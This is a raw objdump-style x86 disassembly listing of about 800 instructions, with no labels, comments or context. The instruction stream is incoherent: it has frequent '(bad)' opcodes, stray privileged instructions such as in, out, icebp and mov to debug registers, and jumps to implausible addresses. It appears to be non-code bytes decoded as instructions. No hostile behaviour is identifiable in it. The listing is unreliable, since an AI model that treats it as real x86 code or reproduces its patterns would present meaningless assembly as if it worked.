  4312d3:	push   DWORD PTR [ebp-0x1]
  4312d6:	lea    ecx,[eax]
  4312d8:	int3   
  4312d9:	inc    ebp
  4312da:	call   0xfb436a
  4312df:	jne    0x4312d9
  4312e1:	xor    edi,DWORD PTR [ebp-0x41]
  4312e4:	jmp    0x431358
  4312e6:	mov    eax,DWORD PTR [eax]
  4312e8:	mov    eax,0x339545c7
  4312ed:	inc    DWORD PTR [ebx]
  4312ef:	push   DWORD PTR [ecx]
  4312f1:	aaa    
  4312f2:	mov    eax,DWORD PTR [eax]
  4312f4:	jmp    0x431346
  4312f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4312f9:	mov    eax,eax
  4312fb:	cld    
  4312fc:	clc    
  4312fd:	ret    
  4312fe:	test   bh,al
  431300:	pop    es
  431301:	xchg   ebp,eax
  431302:	add    bh,bh
  431304:	inc    ebp
  431305:	dec    DWORD PTR [edi]
  431307:	and    DWORD PTR [ebx],ebp
  431309:	add    BYTE PTR [eax],al
  43130b:	push   eax
  43130c:	jbe    0x431363
  43130e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431314:	or     al,0xcf
  431316:	inc    eax
  431317:	enter  0x745,0x72
  43131b:	inc    ebp
  43131c:	mov    eax,DWORD PTR [ecx]
  43131e:	int3   
  43131f:	add    BYTE PTR [ebp-0x75],al
  431322:	ss mov eax,0x33c74d9c
  431328:	ror    BYTE PTR [ebp+0x72f80885],1
  43132e:	inc    ebp
  43132f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431335:	fadd   st,st(6)
  431337:	rol    BYTE PTR [ebp+0x12],0x8b
  43133b:	inc    ebp
  43133c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431342:	inc    ebp
  431343:	test   bh,al
  431345:	cdq    
  431346:	clc    
  431347:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43134d:	inc    ebp
  43134e:	cmp    BYTE PTR [ebx],dh
  431350:	pushf  
  431351:	mov    ecx,0xffb48dc7
  431356:	test   eax,ecx
  431358:	clc    
  431359:	dec    ebp
  43135a:	inc    ebp
  43135b:	mov    edi,DWORD PTR [edx]
  43135d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431364:	test   edi,edi
  431366:	clc    
  431367:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43136e:	(bad)  
  43136f:	enter  0x18e8,0x85
  431373:	ss clc 
  431375:	pushf  
  431376:	inc    ebp
  431377:	dec    DWORD PTR [ebx-0x3cba0f04]
  43137d:	push   eax
  43137e:	xabort 0x7d
  431381:	add    BYTE PTR [ebx],bh
  431383:	mov    ecx,DWORD PTR [edi]
  431385:	mov    DWORD PTR [eax],ebx
  431387:	les    eax,FWORD PTR [eax]
  431389:	adc    ebp,ecx
  43138b:	dec    ebp
  43138c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431392:	mov    ecx,esi
  431394:	lock or al,cl
  431397:	clc    
  431398:	inc    ebp
  431399:	add    esi,DWORD PTR [ebx]
  43139b:	jge    0x4313a0
  43139d:	xor    edi,DWORD PTR [ebx]
  43139f:	cmp    ecx,DWORD PTR [edi]
  4313a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4313a6:	mov    edi,DWORD PTR [ecx]
  4313a8:	test   al,0xcc
  4313aa:	dec    ebp
  4313ab:	test   BYTE PTR [ebx],dh
  4313ad:	pop    es
  4313ae:	xor    eax,DWORD PTR [eax]
  4313b0:	add    ecx,DWORD PTR [esi]
  4313b2:	add    ecx,eax
  4313b4:	psraw  mm0,mm1
  4313b7:	sub    BYTE PTR [ebp+0x38],cl
  4313ba:	mov    edi,DWORD PTR [ebx]
  4313bc:	lock int3 
  4313be:	shl    edx,1
  4313c0:	rol    BYTE PTR [ebp+0xc],1
  4313c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4313ca:	jmp    0x7c1414
  4313cf:	pushf  
  4313d0:	inc    ebp
  4313d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4313d7:	xor    ecx,ebx
  4313d9:	add    ecx,esi
  4313db:	mov    esi,eax
  4313dd:	enter  0x45af,0x8b
  4313e1:	xor    ecx,eax
  4313e3:	add    edx,DWORD PTR [ebp-0x77]
  4313e6:	sub    ecx,DWORD PTR [eax]
  4313e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4313eb:	(bad)  
  4313ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4313f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4313f9:	cmp    esi,DWORD PTR [ebx]
  4313fb:	pushf  
  4313fc:	xor    eax,edi
  4313fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431405:	inc    ebp
  431406:	dec    ebp
  431407:	cmp    eax,0xc7f09c8b
  43140c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431413:	inc    ebp
  431414:	jmp    0x431455
  431416:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43141d:	dec    ebp
  43141e:	xor    esi,DWORD PTR [ebx]
  431420:	add    eax,DWORD PTR [ebx]
  431422:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431428:	dec    ebp
  431429:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43142f:	out    dx,eax
  431430:	rol    BYTE PTR [eax],1
  431432:	add    eax,0xebc8458b
  431437:	dec    ebp
  431438:	mov    ebp,DWORD PTR [ebx]
  43143a:	mov    esp,0x33f84d8b
  43143f:	ret    
  431440:	xor    eax,esi
  431442:	add    ecx,eax
  431444:	add    eax,DWORD PTR [edx+0xc1010f]
  43144a:	dec    ebp
  43144b:	inc    ebp
  43144c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431452:	ror    bl,1
  431454:	add    eax,0xebc645ce
  431459:	scas   eax,DWORD PTR es:[edi]
  43145a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431460:	xor    ebp,DWORD PTR [ebx]
  431462:	xor    edi,DWORD PTR [ebx]
  431464:	add    esi,DWORD PTR [edi+0x3]
  431467:	mov    ecx,DWORD PTR [edi]
  431469:	clc    
  43146a:	rol    ebx,0x4d
  43146d:	(bad)  
  43146e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431475:	mov    ah,0x45
  431477:	dec    ebp
  431478:	jbe    0x4314ad
  43147a:	mov    esi,DWORD PTR [ebx]
  43147c:	call   0x33466184
  431481:	rdpmc  
  431483:	rol    DWORD PTR [ebx],0x4d
  431486:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43148c:	inc    ebp
  43148d:	ror    BYTE PTR [ebx+0x45450808],1
  431493:	jmp    0x10b1523
  431498:	inc    ebp
  431499:	inc    ebp
  43149a:	(bad)  
  43149b:	mov    ebx,eax
  43149d:	clc    
  43149e:	test   ebx,eax
  4314a0:	clc    
  4314a1:	retf   
  4314a2:	inc    ebp
  4314a3:	into   
  4314a4:	mov    esi,0x8b85afec
  4314aa:	clc    
  4314ab:	enter  0x5545,0x38
  4314af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4314b6:	ret    
  4314b7:	mov    ah,0xc6
  4314b9:	addr16 push 0x338b4545
  4314bf:	clc    
  4314c0:	add    eax,ebx
  4314c2:	loopne 0x43148f
  4314c4:	dec    ebp
  4314c5:	into   
  4314c6:	mov    al,dh
  4314c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4314ce:	inc    ebp
  4314cf:	push   ebp
  4314d0:	mov    ebp,DWORD PTR [ebx]
  4314d2:	in     al,dx
  4314d3:	cmp    eax,ebx
  4314d5:	ja     0x43151c
  4314d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4314dd:	inc    ebp
  4314de:	cdq    
  4314df:	mov    esi,DWORD PTR [edx]
  4314e1:	clc    
  4314e2:	mov    bl,al
  4314e4:	xlat   BYTE PTR ds:[ebx]
  4314e5:	retf   
  4314e6:	inc    ebp
  4314e7:	into   
  4314e8:	mov    eax,esi
  4314ea:	in     al,dx
  4314eb:	scas   eax,DWORD PTR es:[edi]
  4314ec:	retf   
  4314ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4314f0:	mov    edx,DWORD PTR [ebp-0x24]
  4314f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4314fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431501:	mov    eax,DWORD PTR [ebx]
  431503:	clc    
  431504:	loopne 0x4314c9
  431506:	push   ebp
  431507:	retf   
  431508:	mov    dh,al
  43150a:	adc    esi,ecx
  43150c:	jb     0x4314bd
  43150e:	add    BYTE PTR [ebx+0x558bc845],cl
  431514:	in     al,dx
  431515:	sub    eax,ebx
  431517:	cmp    ecx,ebx
  431519:	mov    eax,esi
  43151b:	mov    esp,0x45af03ce
  431520:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431526:	mov    eax,ebx
  431528:	in     al,dx
  431529:	into   
  43152a:	dec    ebp
  43152b:	(bad)  
  43152c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431532:	rol    DWORD PTR [ebp+0x4d],0x89
  431536:	xor    esp,esp
  431538:	sub    eax,DWORD PTR [ebp-0x75]
  43153b:	add    ebp,esp
  43153d:	mov    al,0x55
  43153f:	inc    ebp
  431540:	xor    esi,DWORD PTR [esi]
  431542:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431549:	inc    ebp
  43154a:	xor    edi,DWORD PTR [ecx]
  43154c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431553:	test   DWORD PTR [eax],eax
  431555:	clc    
  431556:	enter  0x8645,0x33
  43155a:	inc    DWORD PTR [ebx]
  43155c:	(bad)  
  43155d:	jmp    0x4315a4
  43155f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431565:	inc    ebp
  431566:	(bad)  
  431567:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43156d:	cdq    
  43156e:	retf   
  43156f:	xor    al,cl
  431571:	mov    BYTE PTR [ebp+0xb],cl
  431574:	lea    eax,[ebp+0x8]
  431577:	xor    esi,DWORD PTR [edx+0x3]
  43157a:	add    al,ah
  43157c:	inc    ebp
  43157d:	dec    ebp
  43157e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431584:	addr16 add ch,cl
  431587:	inc    ebp
  431588:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43158e:	inc    ebp
  43158f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431595:	push   ebp
  431596:	(bad)  
  431597:	mov    BYTE PTR [edi+0xf723b11],ch
  43159d:	add    ch,ch
  43159f:	inc    ebp
  4315a0:	dec    DWORD PTR [ebx-0x34332775]
  4315a6:	add    al,0x4d
  4315a8:	inc    ebp
  4315a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4315af:	cdq    
  4315b0:	add    DWORD PTR [edx],esi
  4315b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4315b8:	push   DWORD PTR [ebx]
  4315ba:	int3   
  4315bb:	xor    eax,DWORD PTR [eax]
  4315bd:	add    edx,DWORD PTR [eax+0x3]
  4315c0:	mov    DWORD PTR [edi],ecx
  4315c2:	call   0x4288d688
  4315c7:	mov    DWORD PTR [ebp-0x20],esp
  4315ca:	add    BYTE PTR [ebp+0x7d],al
  4315cd:	mov    eax,DWORD PTR [eax]
  4315cf:	in     al,0x15
  4315d1:	ret    
  4315d2:	iret   
  4315d3:	(bad)  
  4315d4:	enter  0x14af,0x8b
  4315d8:	(bad)  
  4315d9:	in     al,dx
  4315da:	or     bl,cl
  4315dc:	adc    cl,al
  4315de:	push   ebp
  4315df:	dec    ebp
  4315e0:	inc    eax
  4315e1:	mov    edx,DWORD PTR [ebp-0x20]
  4315e4:	jb     0x4315b1
  4315e6:	mov    ecx,esi
  4315e8:	cld    
  4315e9:	scas   eax,DWORD PTR es:[edi]
  4315ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4315f1:	mov    BYTE PTR [eax],0x8c
  4315f4:	push   0xffffff99
  4315f6:	push   edi
  4315f7:	xor    dl,BYTE PTR [eax+0x3b]
  4315fa:	mov    ecx,DWORD PTR [edi]
  4315fc:	call   0x8c425b5f
  431601:	mov    eax,eax
  431603:	in     al,dx
  431604:	jge    0x431653
  431606:	mov    DWORD PTR [ebx],esi
  431608:	int3   
  431609:	add    eax,DWORD PTR [ebp+0xf]
  43160c:	xor    eax,ecx
  43160e:	(bad)  
  43160f:	dec    ebp
  431610:	pushf  
  431611:	xor    ecx,esi
  431613:	add    edi,DWORD PTR [edi]
  431615:	mov    eax,DWORD PTR [ebp-0x38]
  431618:	(bad)  
  431619:	test   dh,dl
  43161b:	cdq    
  43161c:	add    esi,DWORD PTR [edx]
  43161e:	jmp    0x4315a9
  431620:	mov    cl,al
  431622:	add    eax,0x14330f45
  431627:	mov    ecx,0xff448d80
  43162c:	jmp    0xc99025f9
  431631:	mov    edx,ecx
  431633:	rol    BYTE PTR [ebp+0x330155],1
  431639:	add    ecx,DWORD PTR [ebp+0xf]
  43163c:	xor    eax,edx
  43163e:	(bad)  
  43163f:	ror    DWORD PTR [eax],0x86
  431642:	jb     0x431641
  431644:	add    bh,bh
  431646:	clc    
  431647:	inc    ebp
  431648:	jb     0x4316b4
  43164a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431650:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431658:	ret    
  431659:	xor    al,bh
  43165b:	add    BYTE PTR [ebp+0x75],al
  43165e:	ss push 0xffffff9c
  431661:	inc    edi
  431663:	adc    al,0xe8
  431665:	inc    ebp
  431666:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43166c:	mov    ecx,DWORD PTR [eax]
  43166e:	cld    
  43166f:	or     DWORD PTR [ebp-0x34],0x33
  431673:	jbe    0x431678
  431675:	mov    edx,DWORD PTR [ecx+0x2b]
  431678:	dec    ebp
  431679:	mov    cl,BYTE PTR [ebx+0x45d801]
  43167f:	mov    BYTE PTR [ebx],dh
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	or     BYTE PTR [ecx+0x3b],dl
  431686:	dec    ebp
  431687:	int3   
  431688:	xor    ebp,edi
  43168a:	add    eax,DWORD PTR [ebp+0x51]
  43168d:	mov    ecx,DWORD PTR [ebp-0x28]
  431690:	xor    eax,DWORD PTR [eax]
  431692:	add    ebp,DWORD PTR [eax+0x51]
  431695:	adc    BYTE PTR [eax+0x0],0x8b
  431699:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43169f:	inc    ebp
  4316a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4316a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4316ac:	dec    ebp
  4316ad:	mov    esi,DWORD PTR [ebx]
  4316af:	hlt    
  4316b0:	add    eax,ebx
  4316b2:	push   ecx
  4316b3:	inc    ebp
  4316b4:	dec    ebp
  4316b5:	(bad)  
  4316b6:	call   esi
  4316b8:	in     al,0xc7
  4316ba:	retf   
  4316bb:	mov    al,ds:0xc1ff39ce
  4316c0:	adc    al,0xc6
  4316c2:	inc    ebp
  4316c3:	and    eax,0x9c0f4c85
  4316c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4316cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4316d3:	mov    dh,0xc7
  4316d5:	cmp    eax,eax
  4316d7:	jne    0x45440f23
  4316dd:	mov    edi,DWORD PTR [eax]
  4316df:	mov    eax,0x848bcb9c
  4316e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4316eb:	or     BYTE PTR [edi],cl
  4316ed:	(bad)  
  4316ee:	dec    ebp
  4316ef:	inc    edi
  4316f0:	add    bh,0x51
  4316f3:	or     cl,ch
  4316f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4316fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431701:	mov    esp,0xf802b588
  431706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431707:	inc    ebp
  431708:	(bad)  
  431709:	cmp    bh,bh
  43170b:	pushf  
  43170c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431713:	mov    ecx,DWORD PTR [ebp-0x340018]
  431719:	into   
  43171a:	dec    DWORD PTR [ebx-0x7f72431c]
  431720:	push   0x5000ff01
  431725:	retf   
  431726:	inc    ebp
  431727:	into   
  431728:	dec    DWORD PTR [ebx-0x343f3ff4]
  43172e:	push   eax
  43172f:	into   
  431730:	call   0x4b1bc0
  431735:	retf   
  431736:	add    dh,cl
  431738:	add    bh,bh
  43173a:	mov    DWORD PTR [eax+ecx*1],edx
  43173d:	clc    
  43173e:	inc    ebp
  43173f:	inc    ebp
  431740:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431746:	push   0x1
  431748:	push   edi
  431749:	add    BYTE PTR [eax-0x35],dl
  43174c:	mov    ecx,esi
  43174e:	cld    
  43174f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431755:	into   
  431756:	ror    BYTE PTR [ebx+0x75000800],0x50
  43175d:	xor    eax,DWORD PTR [ebp+0x3]
  431760:	jne    0x4317b3
  431762:	call   DWORD PTR [eax-0x3c]
  431765:	mov    DWORD PTR [ecx-0x18],edx
  431768:	mov    edi,edi
  43176a:	call   0x8b465cf3
  43176f:	add    ah,ah
  431771:	rol    BYTE PTR [ebp-0x7c],0xeb
  431775:	add    edi,edi
  431777:	add    al,ch
  431779:	inc    ebp
  43177a:	push   ecx
  43177b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431781:	mov    al,0xc7
  431783:	test   esp,esp
  431785:	clc    
  431786:	test   DWORD PTR [ebp-0x8],ecx
  431789:	add    BYTE PTR [ebp+0x51],0x39
  43178d:	jmp    0x8bcca02e
  431792:	in     al,dx
  431793:	or     BYTE PTR [ebp-0xf],al
  431796:	xor    eax,DWORD PTR [eax+0x4f896703]
  43179c:	hlt    
  43179d:	mov    eax,DWORD PTR [ebp-0x50]
  4317a0:	xor    esi,ecx
  4317a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4317a8:	inc    ebp
  4317a9:	adc    esi,0x68
  4317ac:	pushf  
  4317ad:	inc    edi
  4317af:	add    al,ch
  4317b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317b2:	test   edi,edi
  4317b4:	clc    
  4317b5:	inc    DWORD PTR [ebp-0x73]
  4317b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4317bc:	(bad)  
  4317bd:	push   ecx
  4317be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317bf:	jne    0x431746
  4317c1:	push   eax
  4317c2:	clc    
  4317c3:	test   DWORD PTR [ebp-0x1],eax
  4317c6:	cmp    eax,0xc78b9cff
  4317cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4317d2:	inc    ebp
  4317d3:	push   edi
  4317d4:	aas    
  4317d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4317dc:	dec    ebp
  4317dd:	add    BYTE PTR [ebx],dh
  4317df:	inc    ebp
  4317e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4317e6:	enter  0x8401,0x0
  4317ea:	add    al,BYTE PTR [eax]
  4317ec:	add    bh,bh
  4317ee:	out    dx,eax
  4317ef:	sbb    BYTE PTR [eax],al
  4317f1:	dec    ebp
  4317f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4317f8:	sub    esi,DWORD PTR [ebx]
  4317fa:	mov    ebp,DWORD PTR [eax-0x8]
  4317fd:	add    bl,0x0
  431800:	(bad)  
  431801:	cmp    eax,ecx
  431803:	or     BYTE PTR [edx+0x750114],al
  431809:	inc    DWORD PTR [ebp+0x18]
  43180c:	mov    eax,DWORD PTR [ebp-0x8]
  43180f:	mov    ebx,eax
  431811:	(bad)  
  431812:	retf   
  431813:	inc    ebp
  431814:	into   
  431815:	mov    esi,eax
  431817:	int3   
  431818:	scas   eax,DWORD PTR es:[edi]
  431819:	push   es
  43181a:	mov    esi,DWORD PTR [ebp-0xc]
  43181d:	call   DWORD PTR [ebp+0x18]
  431820:	sub    edi,DWORD PTR [ebp+0x3b]
  431823:	mov    esi,DWORD PTR [edi-0x34]
  431826:	mov    eax,DWORD PTR [ebp-0x8]
  431829:	ss ret 
  43182b:	pushf  
  43182c:	mov    bh,0xbc
  43182f:	fadd   QWORD PTR [eax]
  431831:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431837:	mov    esi,DWORD PTR [ebx]
  431839:	in     al,0x33
  43183b:	ret    
  43183c:	add    eax,esi
  43183e:	add    eax,DWORD PTR [ebp+0xf]
  431841:	mov    eax,ecx
  431843:	in     al,0x4d
  431845:	ret    
  431846:	mov    eax,esi
  431848:	in     al,dx
  431849:	inc    ebp
  43184a:	rol    edi,1
  43184c:	sar    al,1
  43184e:	or     BYTE PTR [ebp+0x45e9f845],al
  431854:	add    BYTE PTR [eax],bh
  431856:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43185d:	test   ebx,eax
  43185f:	clc    
  431860:	retf   
  431861:	inc    ebp
  431862:	into   
  431863:	cmp    al,dh
  431865:	pushf  
  431866:	scas   eax,DWORD PTR es:[edi]
  431867:	(bad)  
  431868:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43186f:	inc    ebp
  431870:	cmp    edi,DWORD PTR [edi+esi*2]
  431873:	pushf  
  431874:	mov    eax,edi
  431876:	mov    esp,0x458567a8
  43187b:	clc    
  43187c:	mov    eax,DWORD PTR [ebp-0x8]
  43187f:	mov    eax,ebx
  431881:	in     al,dx
  431882:	retf   
  431883:	ret    
  431884:	into   
  431885:	mov    dh,0x7d
  431888:	scas   eax,DWORD PTR es:[edi]
  431889:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43188f:	add    BYTE PTR [ebx],ch
  431891:	jmp    0xba19d1
  431896:	mov    eax,DWORD PTR [ebp-0x5c]
  431899:	mov    eax,DWORD PTR [ebp-0x14]
  43189c:	inc    ebp
  43189d:	enter  0x458b,0xf8
  4318a1:	xor    eax,ebx
  4318a3:	add    ecx,ebx
  4318a5:	cmp    ecx,esi
  4318a7:	shufps xmm7,xmm4,0xaf
  4318ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4318b1:	dec    ebp
  4318b2:	sub    esi,DWORD PTR [ebx]
  4318b4:	cmp    esi,DWORD PTR [ebx]
  4318b6:	ja     0x4318bb
  4318b8:	mov    eax,DWORD PTR [ebx]
  4318ba:	lods   al,BYTE PTR ds:[esi]
  4318bb:	mov    db0,ecx
  4318be:	inc    ebp
  4318bf:	dec    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4318c6:	retf   
  4318c7:	rol    dh,1
  4318c9:	or     al,0xce
  4318cb:	inc    ebp
  4318cc:	scas   eax,DWORD PTR es:[edi]
  4318cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4318d3:	add    BYTE PTR [ebx],ch
  4318d5:	add    BYTE PTR [ebx],bh
  4318d7:	inc    ebp
  4318d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4318de:	inc    ebp
  4318df:	retf   
  4318e0:	mov    ecx,esi
  4318e2:	clc    
  4318e3:	(bad)  
  4318e4:	retf   
  4318e5:	scas   eax,DWORD PTR es:[edi]
  4318e6:	ret    
  4318e7:	mov    ecx,esi
  4318e9:	hlt    
  4318ea:	(bad)  
  4318eb:	push   ebp
  4318ec:	scas   eax,DWORD PTR es:[edi]
  4318ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4318f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4318f9:	add    BYTE PTR [ebx],al
  4318fb:	mov    eax,eax
  4318fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318fe:	inc    ebp
  4318ff:	dec    ebp
  431900:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431908:	inc    ebp
  431909:	(bad)  
  43190b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431913:	sar    eax,1
  431915:	rol    BYTE PTR [ebp+0x5],1
  431918:	xor    eax,DWORD PTR [ebp+0x3]
  43191b:	jmp    0x431908
  43191d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431923:	xor    eax,DWORD PTR [ebp+0x33]
  431926:	mov    eax,DWORD PTR [ebx]
  431928:	rol    BYTE PTR [ebx],1
  43192a:	test   BYTE PTR [edi],cl
  43192c:	cdq    
  43192d:	shl    DWORD PTR [edx],0x4d
  431930:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431936:	xor    edx,eax
  431938:	add    eax,DWORD PTR ds:0xeb4d45e0
  43193e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431944:	add    BYTE PTR [ebx],dh
  431946:	inc    ebp
  431947:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  43194d:	rdpmc  
  43194f:	rol    DWORD PTR [ebx],0x4d
  431952:	loopne 0x4318df
  431954:	push   ebp
  431955:	in     al,dx
  431956:	mov    cl,dl
  431958:	adc    eax,edx
  43195a:	jb     0x431961
  43195c:	add    BYTE PTR [ebp+0x45],al
  43195f:	jmp    0x4318ec
  431961:	mov    ebx,eax
  431963:	test   al,0xcb
  431965:	dec    ebp
  431966:	dec    ebp
  431967:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  43196d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431973:	dec    ebp
  431974:	mov    al,0x8b
  431976:	dec    ebp
  431977:	in     al,dx
  431978:	xor    edx,ecx
  43197a:	xor    edx,eax
  43197c:	add    eax,DWORD PTR [ebp+0x3]
  43197f:	jbe    0x431990
  431981:	mov    eax,ecx
  431983:	test   al,0x45
  431985:	dec    ebp
  431986:	mov    DWORD PTR [ebx],esi
  431988:	loopne 0x4319bd
  43198a:	inc    ebp
  43198b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431991:	rol    esi,0x45
  431994:	scas   eax,DWORD PTR es:[edi]
  431995:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  43199b:	mov    eax,ecx
  43199d:	hlt    
  43199e:	dec    ebp
  43199f:	inc    ebp
  4319a0:	mov    eax,edi
  4319a2:	loopne 0x43197c
  4319a4:	retf   
  4319a5:	test   esi,ecx
  4319a7:	clc    
  4319a8:	scas   eax,DWORD PTR es:[edi]
  4319a9:	inc    ebp
  4319aa:	mov    eax,edi
  4319ac:	fdiv   st,st(0)
  4319ae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4319b4:	cdq    
  4319b5:	cmp    BYTE PTR [edx],dh
  4319b7:	pushf  
  4319b8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4319be:	inc    esi
  4319c0:	mov    ebp,DWORD PTR [eax-0x10]
  4319c3:	inc    ebp
  4319c4:	dec    ebp
  4319c5:	xor    esi,DWORD PTR [ebx]
  4319c7:	add    eax,DWORD PTR [ebx]
  4319c9:	loopne 0x4319da
  4319cb:	dec    ebp
  4319cc:	ror    DWORD PTR [edx+0x7233084d],0x3
  4319d3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4319d9:	lock cdq 
  4319db:	ret    
  4319dc:	xor    al,BYTE PTR [ebp-0x77]
  4319df:	mov    esi,esp
  4319e1:	rol    BYTE PTR [ebp-0x7c],1
  4319e4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  4319ea:	call   edi
  4319ec:	enter  0x4d45,0x8b
  4319f0:	mov    esi,eax
  4319f2:	fmul   st(3),st
  4319f4:	push   ebp
  4319f5:	dec    ebp
  4319f6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4319fc:	ret    0xc199
  4319ff:	xor    al,BYTE PTR [esi-0x280276]
  431a05:	dec    ebp
  431a06:	jne    0x431a3b
  431a08:	mov    eax,DWORD PTR [ebx]
  431a0a:	cld    
  431a0b:	loopne 0x4319bd
  431a0d:	push   ebp
  431a0e:	add    DWORD PTR [eax+0x72851100],ecx
  431a14:	inc    DWORD PTR [eax]
  431a16:	inc    DWORD PTR [ebp-0x75]
  431a19:	mov    edi,esp
  431a1b:	lock add bl,0x1
  431a1f:	retf   
  431a20:	add    dh,al
  431a22:	xor    dh,cl
  431a24:	inc    ebp
  431a25:	scas   eax,DWORD PTR es:[edi]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	shl    al,0x0
  431a2b:	inc    ebp
  431a2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431a32:	call   0x462c6a
  431a37:	ud0    eax,ecx
  431a3a:	adc    al,0x4d
  431a3c:	inc    ebp
  431a3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431a43:	lock push 0x338055
  431a49:	add    eax,DWORD PTR [eax]
  431a4b:	ud0    ecx,edx
  431a4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431a51:	xor    ecx,ecx
  431a53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431a5a:	push   ecx
  431a5b:	add    BYTE PTR [ebp-0x38],cl
  431a5e:	mov    DWORD PTR [esi-0x740004],eax
  431a64:	cld    
  431a65:	inc    ebp
  431a66:	nop
  431a67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431a6d:	xabort 0xaf
  431a70:	icebp  
  431a71:	mov    esi,DWORD PTR [ebp-0x28]
  431a74:	(bad)  
  431a75:	retf   
  431a76:	or     ecx,eax
  431a78:	(bad)  
  431a79:	dec    ebp
  431a7a:	pop    es
  431a7b:	(bad)  
  431a7c:	(bad)  
  431a7d:	or     BYTE PTR [esi],al
  431a7f:	jb     0x431a47
